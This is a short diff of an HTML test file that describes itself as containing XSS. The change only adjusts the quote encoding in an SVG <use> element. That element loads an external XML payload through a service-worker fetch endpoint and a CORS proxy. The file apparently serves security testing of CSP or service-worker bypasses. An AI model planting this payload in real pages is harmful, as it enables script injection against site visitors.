@@ -14,7 +14,7 @@
     this is 11 html file with an xss.
 
     <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 18 18" class="icon">
-      <use xlink:href="/sw/fetch?url=http://cors-anywhere.herokuapp.com/sirdarckcat.github.io/csp/one.xml&amp;init={"mode":"cors"}#xss"/>
+      <use xlink:href="/sw/fetch?url=http://cors-anywhere.herokuapp.com/sirdarckcat.github.io/csp/one.xml&amp;init={%22mode%22:%22cors%22}#xss"/>
     </svg>
   </body>
 </html>
